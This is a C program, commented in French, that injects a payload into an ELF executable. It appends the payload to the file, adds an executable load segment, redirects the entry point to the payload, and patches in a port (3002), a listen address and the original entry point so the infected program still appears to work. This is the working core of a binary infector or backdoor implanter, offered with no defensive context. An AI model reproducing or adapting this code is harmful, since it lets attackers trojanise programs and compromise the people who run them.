#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <elf.h>

#ifdef __APPLE__
#define CDECL_NORM(x) x
#else
#define CDECL_NORM(x) _ ## x
#endif /* __APPLE__ */

extern uint8_t CDECL_NORM(payload);
extern uint64_t CDECL_NORM(payload_size);

#define payload_p &CDECL_NORM(payload)
#define payload_size_p CDECL_NORM(payload_size)

uint16_t port = 0;
uint32_t addr_ip = 0;

int main(int argc, char *argv[], char *envp[]) {
    port = htons(3002);
    addr_ip = htonl(INADDR_ANY);
    printf("port: %#x %#x\n", port, addr_ip);

    int fd = open("testprog", O_RDWR);
    if (fd < 0) {
        perror("open");
        return 1;
    }

    printf("payload size: %p, %#lx\n", payload_p, payload_size_p);

    size_t size = lseek(fd, 0, SEEK_END);
    if (size == (size_t)-1) {
        perror("lseek");
        close(fd);
        return 1;
    }
    printf("size of the file: %zu\n", size);

    // Agrandir le fichier pour accueillir les nouvelles données
    if (ftruncate(fd, size + payload_size_p) == -1) {
        perror("ftruncate");
        close(fd);
        return 1;
    }

    // Lire le header ELF
    Elf64_Ehdr ehdr;
    if (pread(fd, &ehdr, sizeof(ehdr), 0) != sizeof(ehdr)) {
        perror("pread");
        close(fd);
        return 1;
    }

    if (memcmp(ehdr.e_ident, ELFMAG, SELFMAG) != 0) {
        fprintf(stderr, "Not an ELF file.\n");
        close(fd);
        return 1;
    }

    // Déterminer le nouveau point d'entrée
    uint64_t old_entry_point = ehdr.e_entry;
    uint64_t new_entry_point = size;

    // Ajouter le payload à la fin du fichier
    if (pwrite(fd, payload_p, payload_size_p, size) != payload_size_p) {
        perror("pwrite");
        close(fd);
        return 1;
    }

    // Mettre à jour le point d'entrée dans le header ELF
    ehdr.e_entry = new_entry_point;
    if (pwrite(fd, &ehdr, sizeof(ehdr), 0) != sizeof(ehdr)) {
        perror("pwrite");
        close(fd);
        return 1;
    }

    // Écrire le nouveau programme header pour le payload
    Elf64_Phdr new_phdr = {
        .p_type = PT_LOAD,
        .p_offset = size,
        .p_vaddr = new_entry_point,
        .p_paddr = new_entry_point,
        .p_filesz = payload_size_p,
        .p_memsz = payload_size_p,
        .p_flags = PF_R | PF_X,
        .p_align = 0x1000
    };

    // Ajouter le nouveau programme header
    if (pwrite(fd, &new_phdr, sizeof(new_phdr), ehdr.e_phoff + ehdr.e_phnum * sizeof(Elf64_Phdr)) != sizeof(new_phdr)) {
        perror("pwrite");
        close(fd);
        return 1;
    }

    // Incrémenter le nombre de programme headers dans le header ELF
    ehdr.e_phnum += 1;
    if (pwrite(fd, &ehdr, sizeof(ehdr), 0) != sizeof(ehdr)) {
        perror("pwrite");
        close(fd);
        return 1;
    }

    // Ajouter le port et l'adresse IP au payload
    if (pwrite(fd, &port, sizeof(port), size + payload_size_p - 4 - 2) != sizeof(port)) {
        perror("pwrite");
        close(fd);
        return 1;
    }

    if (pwrite(fd, &addr_ip, sizeof(addr_ip), size + payload_size_p - 4) != sizeof(addr_ip)) {
        perror("pwrite");
        close(fd);
        return 1;
    }

    // Écrire l'ancien point d'entrée à l'emplacement spécifié dans le payload
    if (pwrite(fd, &old_entry_point, sizeof(old_entry_point), size + payload_size_p - 1190 - 4) != sizeof(old_entry_point)) {
        perror("pwrite");
        close(fd);
        return 1;
    }

    printf("Modification completed successfully.\n");

    close(fd);

    return 0;
}
